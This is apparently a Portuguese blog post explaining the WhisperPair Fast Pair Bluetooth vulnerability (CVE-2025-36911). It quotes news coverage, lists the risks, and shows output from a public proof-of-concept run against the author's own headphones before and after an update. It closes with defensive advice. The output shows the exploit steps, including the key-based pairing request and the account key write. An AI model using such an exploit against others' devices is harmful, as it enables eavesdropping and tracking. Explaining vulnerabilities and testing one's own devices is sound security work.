# Vulnerabilidade do Google Fast Pair

A nova vulnerabilidade descoberta no protocolo Fast Pair da Google permite o pareamento não consensual e potencial gravação e transmissão nesses dispositivos. Vamos comentar.

<https://arstechnica.com/gadgets/2026/01/researchers-reveal-whisperpair-attack-to-eavesdrop-on-google-fast-pair-headphones/>

> Emparelhar dispositivos Bluetooth pode ser complicado, mas o Google Fast Pair torna o processo quase perfeito. Infelizmente, isso também pode deixar seus fones de ouvido vulneráveis ​​a ataques remotos. Uma equipe de pesquisadores de segurança da Universidade KU Leuven, na Bélgica, revelou uma vulnerabilidade chamada WhisperPair que permite que um invasor sequestre dispositivos com Fast Pair ativado para espionar o proprietário.
>
> ...

> A falha surge de uma implementação incompleta do padrão Fast Pair. Dispositivos Bluetooth que recebem uma solicitação de conexão Fast Pair devem aceitá-la somente quando estiverem no modo de emparelhamento. No entanto, os pesquisadores afirmam que muitos dispositivos falham nessa verificação e se emparelham mesmo assim. O WhisperPair força a conexão por meio do processo de emparelhamento Bluetooth padrão.

<https://www.cve.org/CVERecord?id=CVE-2025-36911>

### Antes de irmos muito longe, vamos esclarecer:

- Essa vulnerabilidade é bastante séria, mas é preciso entender o vetor de ataque e o modelo de risco que se corre:
  - Possível parear com dispositivos vulneráveis de 10 a 30 metros de distância
  - Um atacante pareado pode tocar/gravar áudio usando o dispositivo
  - Alguns aparelhos oferecem um serviço de localização + pareamento para encontrar os fones e esse ID pode ser vazado e usado para rastrear a localização do fone
  - Não são apenas usuários Android que estão vulneráveis (é o fone responde ao protocolo Fast Pair)
  - Geralmente não existe opção para desabilitar o Fast Pair nos dispositivos
  - O Google mitigou a vulnerabilidade no Android, mas essa atualização depende dos fabricantes e deve vir nos seus aplicativos de Android, Desktop ou como arquivos nos seus sites.

### Demonstração

{{#embed https://www.youtube.com/watch?v=-j45ShJINtc }}

### Lista de dispositivos vulneráveis:

<https://whisperpair.eu/>

> O bug afeta mais de uma dúzia de dispositivos de 10 fabricantes, incluindo Sony, Nothing, JBL, OnePlus e o próprio Google. O Google reconheceu a falha e notificou seus parceiros sobre o perigo, mas cabe a cada uma dessas empresas criar correções para seus acessórios.

### Rodando com o meu dispositivo:

<https://github.com/Bazskillz/WhisperPair-PoC>

```
╔══════════════════════════════════════════════════════════╗
║  WhisperPair PoC - CVE-2025-36911                        ║
║  Fast Pair Pairing Mode Bypass                           ║
║                                                          ║
║  FOR SECURITY RESEARCH ON YOUR OWN DEVICES ONLY          ║
╚══════════════════════════════════════════════════════════╝
[*] Scanning for Fast Pair devices (10s)...

[+] Found: [device name] RSSI: -64

[+] Found 1 device(s)
[*] Using: [device name]

Press Enter to start exploit...
============================================================
WhisperPair PoC - CVE-2025-36911
============================================================
Target: [device name]
Time: 2026-01-21T00:40:15.628404

[!] Ensure device is NOT in pairing mode for valid test!
[*] Connecting to [mac address]...
[+] Connected!
[*] Model ID: [model ID]
[+] Subscribed to notifications
[+] Subscribed to notifications

────────────────────────────────────────────────────────────
Trying strategy: RAW_KBP
────────────────────────────────────────────────────────────

[*] Sending KBP Request (RAW_KBP)
    Request: 0011c07252b292f288f418dcbefba90c
[!] KBP WRITE ACCEPTED - Device is VULNERABLE!
[*] Waiting for device response...
[!] No notification received (timeout)
[!] Using BLE address as BR/EDR fallback

[*] Writing Account Key...
    Account Key: [account key]
[+] Account Key written successfully!

────────────────────────────────────────────────────────────
Classic Bluetooth Pairing
────────────────────────────────────────────────────────────
[*] Initiating Classic Bluetooth pairing with [mac address]...
[-] Pairing failed: Attempting to pair with [mac address]
[CHG] Device C0:72:52:B2:92:F2 Connected: y

============================================================
EXPLOIT RESULTS
============================================================

╔════════════════════════════════════════════════════════╗
║  ⚠️  DEVICE IS VULNERABLE TO CVE-2025-36911  ⚠️          ║
╚════════════════════════════════════════════════════════╝

Results:
  Model ID: [model ID]
  BR/EDR Address: [mac address]
  KBP Accepted: YES
  Account Key Written: YES
  Classic BT Paired: NO

Notifications received: 0

Implications:
  - Attacker within BLE range (~30m) can force-pair
  - No user interaction required on target device
  - Account key written: device hijacking possible
  - Find Hub tracking may be possible
```

### Rodando depois de instalar o app do dispositivo:

```
╔══════════════════════════════════════════════════════════╗
║  WhisperPair PoC - CVE-2025-36911                        ║
║  Fast Pair Pairing Mode Bypass                           ║
║                                                          ║
║  FOR SECURITY RESEARCH ON YOUR OWN DEVICES ONLY          ║
╚══════════════════════════════════════════════════════════╝
[*] Scanning for Fast Pair devices (10s)...
[+] Found: [device name] RSSI: -50

[+] Found 1 device(s)
[*] Using: [device name]

Press Enter to start exploit...

============================================================
WhisperPair PoC - CVE-2025-36911
============================================================
Target: [mac address]
Time: 2026-01-21T10:04:56.902157

[!] Ensure device is NOT in pairing mode for valid test!
[*] Connecting to [mac address]...
[-] Connection failed: Device with address [mac address] was not found.

============================================================
EXPLOIT RESULTS
============================================================

[+] Device appears to be patched
```

- O teste é meio incerto as vezes, se ele não conectar não é porque o dispositivo não é vulnerável
- Aparentemente o meu dispositivo tinha sido corrigido pela atualização, mas em tentativas posteriores eu consegui parear ele com o laptop... então não
- Bluetooth é um protocolo extremamente radioativo e gambiarrente, esperem que esse tipo de coisa possa acontecer e tomem alguns cuidados:
  - Atualizem seus dispositivos
  - Não deixem ele ligado se não for explicitamente necessário
  - Não usem dispositivos Bluetooth se o conteúdo da conversa sigiloso
